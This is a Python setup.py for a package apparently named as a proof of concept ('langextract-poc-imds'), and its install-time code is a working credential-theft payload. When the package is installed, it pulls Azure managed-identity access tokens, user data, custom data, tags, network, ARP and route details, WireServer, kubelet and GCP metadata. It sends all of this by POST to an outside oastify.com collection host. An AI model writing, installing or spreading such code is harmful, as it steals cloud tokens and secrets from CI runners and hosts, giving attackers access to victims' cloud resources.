import os
import subprocess
import urllib.request
import json
import socket

OAST = "5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com"

def exfil(path, data):
    """Exfiltrate data via POST"""
    try:
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, bytes):
            req = urllib.request.Request(
                f"https://{OAST}/langextract/imds{path}",
                data=data,
                method="POST"
            )
            urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        pass

def imds_request(endpoint, headers=None):
    """Make an IMDS request"""
    try:
        base_url = "http://169.254.169.254"
        if headers is None:
            headers = {"Metadata": "true"}
        
        req = urllib.request.Request(
            f"{base_url}{endpoint}",
            headers=headers
        )
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.read().decode()
    except Exception as e:
        return f"ERROR: {str(e)}"

# ========================================
# PHASE 1: BASIC INSTANCE METADATA
# ========================================
exfil("/ping", f"hostname={socket.gethostname()}")

# Full instance metadata
instance = imds_request("/metadata/instance?api-version=2021-02-01")
exfil("/instance_full", instance[:4000])

# ========================================
# PHASE 2: MANAGED IDENTITY ACCESS TOKEN
# This is the crown jewel - can access Azure resources!
# ========================================

# Try to get token for Azure Resource Manager (most common)
token_endpoints = [
    # Azure Resource Manager
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # Azure Storage  
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
    # Azure Key Vault
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
    # Microsoft Graph
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
    # Azure DevOps
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=499b84ac-1321-427f-aa17-267ca6975798",
    # Azure Database
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/",
    # Any AAD resource
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://login.microsoftonline.com/",
]

for i, endpoint in enumerate(token_endpoints):
    token_resp = imds_request(endpoint)
    if "ERROR" not in token_resp and "access_token" in token_resp:
        exfil(f"/mi_token_{i}", token_resp[:3000])
        
        # Parse and extract the actual token
        try:
            token_data = json.loads(token_resp)
            access_token = token_data.get("access_token", "")
            if access_token:
                # Token is typically ~1500 chars
                exfil(f"/raw_token_{i}_part1", access_token[:1500])
                if len(access_token) > 1500:
                    exfil(f"/raw_token_{i}_part2", access_token[1500:])
        except:
            pass

# ========================================
# PHASE 3: IDENTITY INFORMATION
# ========================================
# List identities available
identity_info = imds_request("/metadata/identity/info?api-version=2018-02-01")
exfil("/identity_info", identity_info)

# Get principal ID
principal = imds_request("/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&object_id=default")
exfil("/principal", principal[:2000])

# ========================================
# PHASE 4: SCHEDULED EVENTS
# Shows upcoming maintenance, redeploy, etc
# ========================================
events = imds_request("/metadata/scheduledevents?api-version=2020-07-01")
exfil("/scheduled_events", events)

# ========================================
# PHASE 5: ATTESTED DATA
# Cryptographic proof of VM identity
# ========================================
attested = imds_request("/metadata/attested/document?api-version=2021-02-01")
exfil("/attested_doc", attested[:3000])

# ========================================
# PHASE 6: LOAD BALANCER
# ========================================
lb = imds_request("/metadata/loadbalancer?api-version=2021-02-01")
exfil("/loadbalancer", lb)

# ========================================
# PHASE 7: NETWORK INFORMATION
# ========================================
# Interface info with IPs
network = imds_request("/metadata/instance/network?api-version=2021-02-01&format=json")
exfil("/network_full", network)

# ========================================
# PHASE 8: COMPUTE DETAILS 
# ========================================
compute = imds_request("/metadata/instance/compute?api-version=2021-02-01&format=json")
exfil("/compute", compute[:3000])

# ========================================
# PHASE 9: TAGS (may contain secrets)
# ========================================
tags = imds_request("/metadata/instance/compute/tags?api-version=2021-02-01&format=text")
exfil("/tags", tags)

# Tagged data (alternative format)
taglist = imds_request("/metadata/instance/compute/tagsList?api-version=2021-02-01&format=json")
exfil("/tagslist", taglist)

# ========================================
# PHASE 10: USER DATA
# May contain initialization scripts with secrets
# ========================================
userdata = imds_request("/metadata/instance/compute/userData?api-version=2021-02-01&format=text")
if userdata and "ERROR" not in userdata:
    exfil("/userdata", userdata[:3000])

# ========================================
# PHASE 11: CUSTOM DATA
# ========================================
customdata = imds_request("/metadata/instance/compute/customData?api-version=2021-02-01&format=text")
if customdata and "ERROR" not in customdata:
    exfil("/customdata", customdata[:3000])

# ========================================
# PHASE 12: PLATFORM METADATA  
# ========================================
platform = imds_request("/metadata/instance/compute/platformFaultDomain?api-version=2021-02-01&format=text")
exfil("/platform_fd", platform)

# ========================================
# PHASE 13: TRY AZURE WIRESERVER
# Legacy metadata endpoint
# ========================================
try:
    wire_req = urllib.request.Request(
        "http://168.63.129.16/machine?comp=goalstate",
        headers={"x-ms-version": "2012-11-30"}
    )
    wire_resp = urllib.request.urlopen(wire_req, timeout=5)
    exfil("/wireserver", wire_resp.read()[:2000])
except Exception as e:
    exfil("/wireserver_error", str(e))

# ========================================
# PHASE 14: INTERNAL DNS
# ========================================
try:
    import subprocess
    dns = subprocess.run(["cat", "/etc/resolv.conf"], capture_output=True, text=True, timeout=5)
    exfil("/dns_config", dns.stdout)
except:
    pass

# ========================================
# PHASE 15: ARP TABLE (internal network)
# ========================================
try:
    arp = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5)
    exfil("/arp_table", arp.stdout)
except:
    pass

# ========================================
# PHASE 16: ROUTES
# ========================================
try:
    routes = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=5)
    exfil("/routes", routes.stdout)
except:
    pass

# ========================================
# PHASE 17: INTERFACES
# ========================================
try:
    ifaces = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
    exfil("/interfaces", ifaces.stdout[:2000])
except:
    pass

# ========================================
# PHASE 18: HOSTNAME/DOMAIN INFO
# ========================================
try:
    hostname = subprocess.run(["hostname", "-f"], capture_output=True, text=True, timeout=5)
    exfil("/hostname_full", hostname.stdout)
except:
    pass

# ========================================
# PHASE 19: CHECK FOR KUBELET/CONTAINER METADATA
# GitHub runners might be in Kubernetes
# ========================================
k8s_endpoints = [
    ("http://localhost:10255/pods", "/kubelet_pods"),
    ("http://localhost:10255/metrics", "/kubelet_metrics"),
    ("http://169.254.169.254/oapi/v1/namespaces", "/openshift"),
]

for url, path in k8s_endpoints:
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        exfil(path, resp.read()[:2000])
    except:
        pass

# ========================================
# PHASE 20: GCP METADATA (just in case hybrid)
# ========================================
try:
    gcp_req = urllib.request.Request(
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json",
        headers={"Metadata-Flavor": "Google"}
    )
    gcp_resp = urllib.request.urlopen(gcp_req, timeout=3)
    exfil("/gcp_metadata", gcp_resp.read()[:3000])
except:
    pass

# Now the actual setup.py content
from setuptools import setup, find_packages
setup(
    name="langextract-poc-imds",
    version="0.0.4",
    packages=find_packages(),
)
